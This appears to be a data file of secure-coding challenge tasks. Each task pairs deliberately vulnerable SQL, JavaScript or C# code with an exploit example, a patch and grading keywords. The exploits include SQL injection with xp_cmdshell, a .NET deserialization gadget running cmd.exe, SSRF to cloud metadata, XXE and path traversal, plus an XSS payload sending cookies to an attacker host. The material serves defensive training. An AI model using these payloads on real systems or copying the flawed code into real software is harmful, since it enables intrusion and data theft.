import { CodeTask } from '../types';

export const ROUND2_TASKS: CodeTask[] = [
  {
    id: 'sql_sp_injection',
    title: 'Task 1: SQL Injection in Stored Procedure Dynamic Query',
    language: 'sql',
    cwe: 'CWE-89: SQL Injection',
    code: `CREATE PROCEDURE dbo.GetUserRecords
    @UserRole NVARCHAR(50),
    @SearchKeyword NVARCHAR(100)
AS
BEGIN
    SET NOCOUNT ON;
    -- Dynamic SQL string concatenation with unvalidated parameters
    DECLARE @SqlStatement NVARCHAR(MAX);
    SET @SqlStatement = N'SELECT UserID, Username, Email, Role FROM dbo.AppUsers ' +
                        N'WHERE Role = ''' + @UserRole + ''' AND Username LIKE ''%' + @SearchKeyword + '%''';
    
    -- Direct execution of concatenated SQL string
    EXEC(@SqlStatement);
END;`,
    vulnSummary: 'SQL Injection via dynamic SQL string concatenation inside a T-SQL stored procedure executed with EXEC() rather than parameterized execution.',
    exploitExample: `@SearchKeyword = N'%' UNION SELECT UserID, PasswordHash, Email, Role FROM dbo.AppUsers--
OR
@UserRole = N'admin'' OR 1=1--'`,
    patchCode: `CREATE PROCEDURE dbo.GetUserRecords
    @UserRole NVARCHAR(50),
    @SearchKeyword NVARCHAR(100)
AS
BEGIN
    SET NOCOUNT ON;
    -- Parameterized dynamic execution using sp_executesql
    DECLARE @SqlStatement NVARCHAR(MAX);
    SET @SqlStatement = N'SELECT UserID, Username, Email, Role FROM dbo.AppUsers ' +
                        N'WHERE Role = @RoleParam AND Username LIKE @SearchParam';
    
    DECLARE @SearchWildcard NVARCHAR(102) = N'%' + @SearchKeyword + N'%';
    
    EXEC sp_executesql 
        @stmt = @SqlStatement,
        @params = N'@RoleParam NVARCHAR(50), @SearchParam NVARCHAR(102)',
        @RoleParam = @UserRole,
        @SearchParam = @SearchWildcard;
END;`,
    keywords: {
      vuln: ['sql', 'injection', 'dynamic', 'concat', 'exec(', 'stored procedure', 'unparameterized', 'sanitize'],
      exploit: ['union', "'--", 'or 1=1', "admin'", '--', 'xp_cmdshell', 'or'],
      patch: ['sp_executesql', 'parameter', 'bind', '@param', 'prepared', 'static query']
    },
    hint: 'Avoid EXEC(@SqlStatement) with string concatenation. Use sp_executesql with strongly typed parameter definitions (@params).'
  },
  {
    id: 'js_prototype_pollution',
    title: 'Task 2: Prototype Pollution in Node.js Deep Merge Utility',
    language: 'javascript',
    cwe: 'CWE-1321: Improperly Controlled Modification of Object Prototype Attributes',
    code: `// Express utility endpoint merging client preferences into server profile
function deepMerge(target, source) {
  for (const key of Object.keys(source)) {
    if (source[key] instanceof Object && key in target) {
      deepMerge(target[key], source[key]);
    } else {
      // Dangerous assignment allows modifying Object.prototype via __proto__ or constructor
      target[key] = source[key];
    }
  }
  return target;
}

app.post('/api/user/settings', (req, res) => {
  const userSettings = req.body;
  const updatedConfig = deepMerge(defaultConfig, userSettings);
  res.json({ status: 'ok', config: updatedConfig });
});`,
    vulnSummary: 'Prototype Pollution — recursive object merger without filtering __proto__ or constructor.prototype keys allows modifying global Object prototype, causing privilege escalation or DoS/RCE.',
    exploitExample: `POST /api/user/settings
Content-Type: application/json

{
  "__proto__": {
    "isAdmin": true,
    "role": "SuperAdmin",
    "shell": "/bin/bash"
  }
}`,
    patchCode: `function safeDeepMerge(target, source) {
  for (const key of Object.keys(source)) {
    // Block proto and constructor prototype poisoning
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
      continue;
    }
    if (source[key] && typeof source[key] === 'object' && !Array.isArray(source[key])) {
      if (!target[key] || typeof target[key] !== 'object') {
        target[key] = Object.create(null);
      }
      safeDeepMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}`,
    keywords: {
      vuln: ['prototype', 'pollution', '__proto__', 'constructor', 'recursive merge', 'object.prototype', 'gadget'],
      exploit: ['__proto__', 'constructor', 'prototype', 'isadmin', 'pollute'],
      patch: ['__proto__', 'continue', 'object.create(null)', 'freeze', 'map', 'validate keys', 'block']
    },
    hint: 'Sanitize incoming keys to explicitly block __proto__, constructor, and prototype, or use Object.create(null) / Map.'
  },
  {
    id: 'csharp_insecure_deserialization',
    title: 'Task 3: Insecure JSON Deserialization (RCE) in ASP.NET Core',
    language: 'csharp',
    cwe: 'CWE-502: Deserialization of Untrusted Data',
    code: `[HttpPost("api/session/restore")]
public IActionResult RestoreSession([FromBody] string base64Payload)
{
    string jsonPayload = Encoding.UTF8.GetString(Convert.FromBase64String(base64Payload));
    
    // Insecure TypeNameHandling enables arbitrary .NET gadget chain instantiation
    var settings = new JsonSerializerSettings
    {
        TypeNameHandling = TypeNameHandling.All
    };
    
    object sessionObj = JsonConvert.DeserializeObject(jsonPayload, settings);
    return Ok(new { status = "restored", type = sessionObj.GetType().Name });
}`,
    vulnSummary: 'Insecure Deserialization via Newtonsoft.Json TypeNameHandling.All on untrusted input, enabling Remote Code Execution (RCE) via arbitrary .NET gadget chains.',
    exploitExample: `{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System"
  },
  "MethodParameters": {
    "$type": "System.Collections.ArrayList",
    "$values": ["cmd.exe", "/c whoami > C:\\\\pwned.txt"]
  }
}`,
    patchCode: `[HttpPost("api/session/restore")]
public IActionResult RestoreSession([FromBody] string base64Payload)
{
    string jsonPayload = Encoding.UTF8.GetString(Convert.FromBase64String(base64Payload));
    
    // Safe deserialization: disable TypeNameHandling and deserialize to strict strongly-typed DTO
    var settings = new JsonSerializerSettings
    {
        TypeNameHandling = TypeNameHandling.None
    };
    
    UserSessionDto session = JsonConvert.DeserializeObject<UserSessionDto>(jsonPayload, settings);
    if (session == null) return BadRequest("Invalid session payload");
    
    return Ok(new { status = "restored", userId = session.UserId });
}`,
    keywords: {
      vuln: ['typenamehandling', 'deserial', 'rce', 'newtonsoft', 'gadget', 'objectdataprovider', 'untrusted'],
      exploit: ['$type', 'objectdataprovider', 'process.start', 'system.diagnostics', 'cmd.exe', 'powershell'],
      patch: ['typenamehandling.none', 'system.text.json', 'strongly-typed', 'dto', 'serializationbinder', 'none']
    },
    hint: 'Set TypeNameHandling to TypeNameHandling.None and deserialize strictly into a predefined concrete DTO class (UserSessionDto).'
  },
  {
    id: 'js_ssrf',
    title: 'Task 4: Server-Side Request Forgery (SSRF) in Node.js / Express',
    language: 'javascript',
    cwe: 'CWE-918: Server-Side Request Forgery (SSRF)',
    code: `const express = require('express');
const axios = require('axios');
const app = express();

app.post('/api/webhook/test', async (req, res) => {
  const { webhookUrl } = req.body;
  
  // Directly sending outbound HTTP GET to user-supplied endpoint
  try {
    const response = await axios.get(webhookUrl, { timeout: 4000 });
    res.json({ delivered: true, responseData: response.data });
  } catch (err) {
    res.status(500).json({ error: 'Webhook connection failed' });
  }
});`,
    vulnSummary: 'Server-Side Request Forgery (SSRF) allows external attackers to force the Node.js backend to query internal cloud metadata services (169.254.169.254) or localhost loopback interfaces.',
    exploitExample: `POST /api/webhook/test
{
  "webhookUrl": "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
}
OR
{
  "webhookUrl": "http://127.0.0.1:6379/INFO"
}`,
    patchCode: `const { URL } = require('url');
const dns = require('dns').promises;
const ipaddr = require('ipaddr.js');

async function isSafeUrl(rawUrl) {
  const parsed = new URL(rawUrl);
  if (!['http:', 'https:'].includes(parsed.protocol)) return false;
  
  const { address } = await dns.lookup(parsed.hostname);
  const addr = ipaddr.parse(address);
  const range = addr.range();
  
  // Reject loopback, private RFC1918, link-local metadata (169.254.x.x)
  if (['loopback', 'private', 'linkLocal', 'carrierGradeNat'].includes(range)) {
    return false;
  }
  return true;
}

app.post('/api/webhook/test', async (req, res) => {
  const { webhookUrl } = req.body;
  if (!await isSafeUrl(webhookUrl)) {
    return res.status(403).json({ error: 'Destination URL forbidden by egress policy' });
  }
  const response = await axios.get(webhookUrl, { timeout: 4000, maxRedirects: 0 });
  res.json({ delivered: true, status: response.status });
});`,
    keywords: {
      vuln: ['ssrf', 'axios', 'metadata', 'loopback', '169.254', 'internal', 'server-side request', 'egress'],
      exploit: ['169.254.169.254', 'localhost', '127.0.0.1', 'metadata', 'file://', 'aws', 'gcp'],
      patch: ['dns.lookup', 'ipaddr', 'private', 'loopback', 'whitelist', 'allowlist', 'maxredirects', 'range']
    },
    hint: 'Resolve DNS hostname prior to request, reject loopback (127.0.0.1), private RFC1918, and link-local (169.254.169.254) ranges, and disable HTTP redirects.'
  },
  {
    id: 'csharp_sqli_raw',
    title: 'Task 5: SQL Injection via ADO.NET SqlCommand Concatenation in C#',
    language: 'csharp',
    cwe: 'CWE-89: SQL Injection',
    code: `[HttpGet("api/products/search")]
public async Task<IActionResult> SearchProducts([FromQuery] string category, [FromQuery] string sortBy)
{
    using var connection = new SqlConnection(_connectionString);
    await connection.OpenAsync();
    
    // Insecure string interpolation directly in SQL command text
    string query = $"SELECT ProductId, Title, Price, Category FROM Products " +
                   $"WHERE Category = '{category}' ORDER BY {sortBy} ASC";
    
    using var command = new SqlCommand(query, connection);
    using var reader = await command.ExecuteReaderAsync();
    var results = new List<ProductDto>();
    while (await reader.ReadAsync())
    {
        results.Add(new ProductDto(reader.GetInt32(0), reader.GetString(1), reader.GetDecimal(2)));
    }
    return Ok(results);
}`,
    vulnSummary: 'SQL Injection via string interpolation in ADO.NET SqlCommand, compromising both the WHERE clause filter and the ORDER BY clause.',
    exploitExample: `GET /api/products/search?category=Electronics' UNION SELECT 1, PasswordHash, 0, Role FROM AspNetUsers--&sortBy=Price
OR
GET /api/products/search?category=Books&sortBy=(CASE WHEN (SELECT SUBSTRING(PasswordHash,1,1) FROM AspNetUsers WHERE UserName='admin')='a' THEN Price ELSE Title END)`,
    patchCode: `[HttpGet("api/products/search")]
public async Task<IActionResult> SearchProducts([FromQuery] string category, [FromQuery] string sortBy)
{
    // Whitelist allowed sort columns to prevent SQL injection in ORDER BY clause
    var allowedColumns = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { "Price", "Title", "ProductId" };
    string safeSort = allowedColumns.Contains(sortBy) ? sortBy : "ProductId";
    
    using var connection = new SqlConnection(_connectionString);
    await connection.OpenAsync();
    
    // Parameterize query arguments
    string query = $"SELECT ProductId, Title, Price, Category FROM Products WHERE Category = @Category ORDER BY {safeSort} ASC";
    
    using var command = new SqlCommand(query, connection);
    command.Parameters.Add("@Category", SqlDbType.NVarChar, 100).Value = category ?? string.Empty;
    
    using var reader = await command.ExecuteReaderAsync();
    var results = new List<ProductDto>();
    while (await reader.ReadAsync())
    {
        results.Add(new ProductDto(reader.GetInt32(0), reader.GetString(1), reader.GetDecimal(2)));
    }
    return Ok(results);
}`,
    keywords: {
      vuln: ['sql', 'injection', 'interpolation', 'concatenat', 'order by', 'sqlcommand', 'unsanitiz'],
      exploit: ['union', "'--", 'or 1=1', 'aspnetusers', 'passwordhash', '--', 'case when'],
      patch: ['parameters.add', 'parameter', 'whitelist', 'safesort', 'prepared', 'sqldbtype', 'bind']
    },
    hint: 'Use SqlCommand.Parameters.AddWithValue or Parameters.Add for values, and strictly whitelist column names for dynamic ORDER BY clauses.'
  },
  {
    id: 'js_stored_xss',
    title: 'Task 6: Stored Cross-Site Scripting (XSS) via Unsanitized innerHTML in JS',
    language: 'javascript',
    cwe: 'CWE-79: Cross-Site Scripting (Stored XSS)',
    code: `// Express API persisting raw user markup
app.post('/api/feed/post', async (req, res) => {
  const { author, bioHtml } = req.body;
  await db.collection('profiles').updateOne({ author }, { $set: { bioHtml } }, { upsert: true });
  res.json({ status: 'saved' });
});

// Client-side DOM render handler
function renderUserProfile(containerElement, userRecord) {
  // Vulnerable sink: innerHTML directly inserts unsanitized user-authored bioHtml
  containerElement.innerHTML = \`
    <div class="user-card">
      <h3>\${userRecord.author}</h3>
      <div class="bio">\${userRecord.bioHtml}</div>
    </div>
  \`;
}`,
    vulnSummary: 'Stored Cross-Site Scripting (XSS) caused by saving unsanitized HTML in the backend and assigning it directly to the dangerous DOM innerHTML sink in the client.',
    exploitExample: `POST /api/feed/post
{
  "author": "attacker",
  "bioHtml": "<img src=x onerror=\\"fetch('https://c2.attacker.com/log?c='+encodeURIComponent(document.cookie))\\">"
}`,
    patchCode: `// Client-side remediation using DOMPurify and safe text assignment
import DOMPurify from 'dompurify';

function renderUserProfile(containerElement, userRecord) {
  // Option A: Sanitize through DOMPurify before innerHTML assignment
  const cleanBio = DOMPurify.sanitize(userRecord.bioHtml, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p'],
    ALLOWED_ATTR: []
  });

  containerElement.innerHTML = \`
    <div class="user-card">
      <h3 id="author-name"></h3>
      <div class="bio">\${cleanBio}</div>
    </div>
  \`;
  containerElement.querySelector('#author-name').textContent = userRecord.author;
}`,
    keywords: {
      vuln: ['xss', 'stored', 'innerhtml', 'sink', 'sanitiz', 'script', 'dom', 'cross-site'],
      exploit: ['<script', 'onerror', 'document.cookie', '<img', 'alert', 'fetch(', 'svg'],
      patch: ['dompurify', 'sanitize', 'textcontent', 'encode', 'escape', 'csp', 'allowed_tags']
    },
    hint: 'Sanitize incoming HTML strings using DOMPurify before inserting into innerHTML, or bind plain text via textContent.'
  },
  {
    id: 'csharp_xxe',
    title: 'Task 7: XML External Entity (XXE) Injection in .NET XmlDocument',
    language: 'csharp',
    cwe: 'CWE-611: Improper Restriction of XML External Entity Reference',
    code: `[HttpPost("api/invoices/import")]
public IActionResult ImportInvoice([FromBody] string rawXml)
{
    // Insecure XmlReaderSettings permitting DTD parsing and external entity resolution
    var settings = new XmlReaderSettings
    {
        DtdProcessing = DtdProcessing.Parse,
        XmlResolver = new XmlUrlResolver() // Resolves external SYSTEM URLs
    };
    
    var xmlDoc = new XmlDocument();
    using var stringReader = new StringReader(rawXml);
    using var reader = XmlReader.Create(stringReader, settings);
    
    xmlDoc.Load(reader);
    string totalAmount = xmlDoc.SelectSingleNode("//Invoice/Total")?.InnerText;
    return Ok(new { total = totalAmount });
}`,
    vulnSummary: 'XML External Entity (XXE) injection caused by DtdProcessing.Parse and XmlUrlResolver, allowing arbitrary file retrieval, internal network SSRF, and resource exhaustion.',
    exploitExample: `<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE invoice [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<Invoice>
  <Total>&xxe;</Total>
</Invoice>`,
    patchCode: `[HttpPost("api/invoices/import")]
public IActionResult ImportInvoice([FromBody] string rawXml)
{
    // Secure XML reader settings: prohibit DTD processing and remove external resolver
    var settings = new XmlReaderSettings
    {
        DtdProcessing = DtdProcessing.Prohibit,
        XmlResolver = null,
        MaxCharactersFromEntities = 0
    };
    
    var xmlDoc = new XmlDocument();
    using var stringReader = new StringReader(rawXml);
    using var reader = XmlReader.Create(stringReader, settings);
    
    xmlDoc.Load(reader);
    string totalAmount = xmlDoc.SelectSingleNode("//Invoice/Total")?.InnerText;
    return Ok(new { total = totalAmount });
}`,
    keywords: {
      vuln: ['xxe', 'dtd', 'external entity', 'xmlurlresolver', 'dtdprocessing', 'system', 'xmlreader'],
      exploit: ['<!doctype', '<!entity', 'system', 'file:///', 'win.ini', '&xxe;'],
      patch: ['dtdprocessing.prohibit', 'xmlresolver = null', 'prohibit', 'disable dtd', 'null']
    },
    hint: 'Configure XmlReaderSettings with DtdProcessing = DtdProcessing.Prohibit and XmlResolver = null to reject external DTD entities.'
  },
  {
    id: 'js_idor_bola',
    title: 'Task 8: Insecure Direct Object Reference (IDOR / BOLA) in Express API',
    language: 'javascript',
    cwe: 'CWE-639: Authorization Bypass Through User-Controlled Key',
    code: `const express = require('express');
const app = express();

// authenticateUser verifies JWT signature and populates req.user = { id, orgId, role }
app.get('/api/orgs/:orgId/invoices/:invoiceId', authenticateUser, async (req, res) => {
  const { invoiceId } = req.params;
  
  // Vulnerable lookup: queries strictly by invoiceId without scoping to req.user.orgId
  const invoice = await db.collection('invoices').findOne({ invoiceId: invoiceId });
  if (!invoice) {
    return res.status(404).json({ error: 'Invoice not found' });
  }
  
  res.json(invoice);
});`,
    vulnSummary: 'Insecure Direct Object Reference (IDOR / BOLA) — the endpoint reads records using caller-provided invoiceId without verifying that the invoice belongs to the authenticated user\'s organization.',
    exploitExample: `1. Authenticate with valid credentials belonging to Org A (req.user.orgId = "org_101").
2. Issue request:
GET /api/orgs/org_101/invoices/inv_9944
(where inv_9944 belongs to Org B)
3. API returns confidential financial records of Org B.`,
    patchCode: `app.get('/api/orgs/:orgId/invoices/:invoiceId', authenticateUser, async (req, res) => {
  const { orgId, invoiceId } = req.params;
  
  // 1. Verify user belongs to the requested organization or has global auditor role
  if (req.user.orgId !== orgId && req.user.role !== 'SystemAuditor') {
    return res.status(403).json({ error: 'Forbidden: You do not have access to this organization' });
  }
  
  // 2. Query strictly scoped to both invoiceId AND verified orgId
  const invoice = await db.collection('invoices').findOne({ 
    invoiceId: invoiceId, 
    orgId: req.user.orgId 
  });
  
  if (!invoice) {
    return res.status(404).json({ error: 'Invoice not found' });
  }
  
  res.json(invoice);
});`,
    keywords: {
      vuln: ['idor', 'bola', 'authoriz', 'access control', 'orgid', 'ownership', 'multitenant', 'unauthorized'],
      exploit: ['enumerate', 'change id', 'inv_', 'other org', 'horizontal privilege', 'tenant'],
      patch: ['req.user.orgid', '403', 'scope', 'ownership', 'forbidden', 'verify', 'tenantid']
    },
    hint: 'Enforce tenant isolation by verifying req.user.orgId matches req.params.orgId and appending { orgId: req.user.orgId } to the database query.'
  },
  {
    id: 'csharp_path_traversal',
    title: 'Task 9: Path Traversal & Arbitrary File Retrieval in ASP.NET Core',
    language: 'csharp',
    cwe: 'CWE-22: Improper Limitation of a Pathname to a Restricted Directory',
    code: `[HttpGet("api/reports/download")]
public async Task<IActionResult> DownloadReport([FromQuery] string reportName)
{
    string baseStoragePath = Path.Combine(_hostingEnv.ContentRootPath, "App_Data", "Reports");
    
    // Insecure concatenation allows directory traversal using relative sequences like ../
    string targetFilePath = Path.Combine(baseStoragePath, reportName);
    
    if (!System.IO.File.Exists(targetFilePath))
    {
        return NotFound(new { error = "Report does not exist" });
    }
    
    byte[] fileBytes = await System.IO.File.ReadAllBytesAsync(targetFilePath);
    return File(fileBytes, "application/octet-stream", Path.GetFileName(targetFilePath));
}`,
    vulnSummary: 'Path Traversal (Directory Traversal) via Path.Combine without canonical path validation, allowing attackers to read arbitrary files such as appsettings.json or Windows system files.',
    exploitExample: `GET /api/reports/download?reportName=../../appsettings.json
OR
GET /api/reports/download?reportName=..%2F..%2F..%2Fwindows%2Fwin.ini
OR
GET /api/reports/download?reportName=..\\..\\..\\inetpub\\wwwroot\\web.config`,
    patchCode: `[HttpGet("api/reports/download")]
public async Task<IActionResult> DownloadReport([FromQuery] string reportName)
{
    if (string.IsNullOrWhiteSpace(reportName)) return BadRequest("Report name required");
    
    // Strip directory traversal paths by enforcing single filename
    string safeFileName = Path.GetFileName(reportName);
    
    string baseStoragePath = Path.GetFullPath(Path.Combine(_hostingEnv.ContentRootPath, "App_Data", "Reports"));
    string targetFilePath = Path.GetFullPath(Path.Combine(baseStoragePath, safeFileName));
    
    // Verify canonical path resides strictly within the allowed directory
    if (!targetFilePath.StartsWith(baseStoragePath, StringComparison.OrdinalIgnoreCase))
    {
        return StatusCode(403, new { error = "Access to path forbidden" });
    }
    
    if (!System.IO.File.Exists(targetFilePath))
    {
        return NotFound(new { error = "Report does not exist" });
    }
    
    byte[] fileBytes = await System.IO.File.ReadAllBytesAsync(targetFilePath);
    return File(fileBytes, "application/octet-stream", safeFileName);
}`,
    keywords: {
      vuln: ['path traversal', 'directory traversal', '../', 'arbitrary file', 'path.combine', 'relative path', 'file read'],
      exploit: ['../', '..%2f', 'appsettings.json', 'win.ini', 'web.config', '..\\'],
      patch: ['path.getfilename', 'path.getfullpath', 'startswith', 'canonical', 'whitelist', 'sandbox']
    },
    hint: 'Use Path.GetFileName to strip directory separators and verify the resolved Path.GetFullPath starts with baseStoragePath.'
  },
  {
    id: 'sql_second_order_injection',
    title: 'Task 10: Second-Order SQL Injection in Stored Audit Trigger',
    language: 'sql',
    cwe: 'CWE-89: SQL Injection',
    code: `-- Audit Trigger executed when user profile or organization is updated
CREATE TRIGGER trg_AuditOrganizationChange
ON dbo.Organizations
AFTER UPDATE
AS
BEGIN
    SET NOCOUNT ON;
    DECLARE @OrgId INT, @OrgName NVARCHAR(200), @SqlCmd NVARCHAR(MAX);
    
    SELECT @OrgId = OrgId, @OrgName = OrgName FROM inserted;
    
    -- Second-order SQL injection: dynamically assembling unescaped values retrieved from DB
    SET @SqlCmd = N'INSERT INTO dbo.AuditLog (OrgId, Note, LoggedAt) ' +
                  N'VALUES (' + CAST(@OrgId AS NVARCHAR(10)) + N', ''Org updated to ' + @OrgName + ''', GETUTCDATE());';
    
    EXECUTE(@SqlCmd);
END;`,
    vulnSummary: 'Second-Order SQL Injection — unsanitized data stored previously in the database is subsequently retrieved inside a database trigger and concatenated into dynamic SQL executed with EXECUTE().',
    exploitExample: `-- Step 1: Update Organization Name to contain payload
UPDATE dbo.Organizations 
SET OrgName = N'AcmeCorp'', GETUTCDATE()); EXEC xp_cmdshell ''whoami'';--' 
WHERE OrgId = 42;

-- Trigger executes:
-- INSERT INTO dbo.AuditLog ... VALUES (42, 'Org updated to AcmeCorp', GETUTCDATE()); EXEC xp_cmdshell 'whoami';--'`,
    patchCode: `ALTER TRIGGER trg_AuditOrganizationChange
ON dbo.Organizations
AFTER UPDATE
AS
BEGIN
    SET NOCOUNT ON;
    
    -- Eliminate dynamic SQL concatenation entirely; use standard parameterized set-based INSERT
    INSERT INTO dbo.AuditLog (OrgId, Note, LoggedAt)
    SELECT 
        i.OrgId,
        CONCAT(N'Org updated to ', i.OrgName),
        GETUTCDATE()
    FROM inserted i;
END;`,
    keywords: {
      vuln: ['second-order', 'sql', 'injection', 'trigger', 'dynamic', 'concat', 'execute', 'inserted'],
      exploit: ["'--", 'xp_cmdshell', 'exec', "');", 'update dbo.organizations', 'payload'],
      patch: ['set-based', 'parameterized', 'eliminate dynamic', 'insert into', 'concat', 'no execute']
    },
    hint: 'Remove dynamic SQL inside triggers. Use standard set-based parameterized INSERT queries with CONCAT() or sp_executesql.'
  }
];
